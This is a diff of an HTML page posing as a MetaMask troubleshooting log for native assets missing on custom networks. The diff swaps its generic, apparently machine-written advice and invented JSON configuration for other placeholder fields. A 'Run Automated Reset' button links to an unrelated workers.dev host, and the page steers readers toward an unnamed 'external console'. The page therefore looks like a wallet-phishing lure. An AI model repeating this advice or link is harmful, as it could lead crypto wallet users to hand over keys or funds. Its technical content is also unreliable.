@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: -apple-system;
-        background: #0a0c10;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #ff7b2c; }
     .btn {
         background: #cf6679;
         color: #000;
@@ -42,39 +42,35 @@
 <h1>Metamask Extension Bug Assets Native Assets For Custom Networks</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users are unable to view native assets for custom networks when selecting them in the Metamask extension, despite having added the custom network and assets correctly.</li>
+<li>Users are unable to view native assets for custom networks when selected in the Metamask extension, resulting in an incomplete display of available assets.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a bug in the Metamask extension that prevents it from properly fetching and displaying native assets for custom networks, likely caused by an issue with the extension's asset detection logic or its interaction with the Ethereum blockchain.</li>
+<li>The error occurs due to a bug in the Metamask extension's asset handling mechanism, which fails to properly fetch and display native assets for custom networks.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can try the following manual overrides:</li>
-<li>Update the Metamask extension to the latest version to ensure any known bugs are fixed.</li>
-<li>Manually add the native asset for the custom network using the <code>eth_asset</code> JSON object:</li>
+<li>To resolve the issue, users can attempt the following manual overrides:</li>
+<li>Update the Metamask extension to the latest version</li>
+<li>Manually add the native asset token for the custom network using the following JSON configuration:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...asset_contract_address&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;decimals&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">18</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;image&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://...asset_image_url&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Custom Network Native Asset&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;symbol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;CNNA&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;erc20&quot;</span>
+<span class="w">  </span><span class="nt">&quot;chainId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x1234&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;tokenAddress&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x5678&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;tokenSymbol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;CUSTOM&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;tokenDecimal&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">18</span>
 <span class="p">}</span>
 </code></pre></div>
 
 <ul>
-<li>Clear the Metamask extension's cache and restart the browser to ensure any outdated data is removed.
-Consider utilizing an external console for more advanced debugging and configuration options.</li>
+<li>Clear the Metamask extension's cache and restart the browser</li>
 </ul>
-<h2>Prerequisites</h2>
-<ul>
-<li>Metamask extension installed and configured</li>
-<li>Custom network added to the Metamask extension</li>
-<li>Native asset contract address and details available</li>
-</ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-miss-match-between-network-picker.html">Metamask Extension Bug Assets Miss Match Between Network Picker</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-incorrect-balance-for-aave-v3-wavax-toke.html">Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token</a></li></ul>
+<p>Prerequisites:
+* Metamask extension installed and configured
+* Custom network added to the Metamask extension
+* Native asset token information available for the custom network
+For further troubleshooting, consider using an external console to inspect the Metamask extension's logs and configuration.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-sign-message-clicking-back-button-in-the.html">Metamask Extension Bug Sign Message Clicking Back Button In The</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-extension-bug-incorrect-balance-for-aave-v3-wavax-toke.html">Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
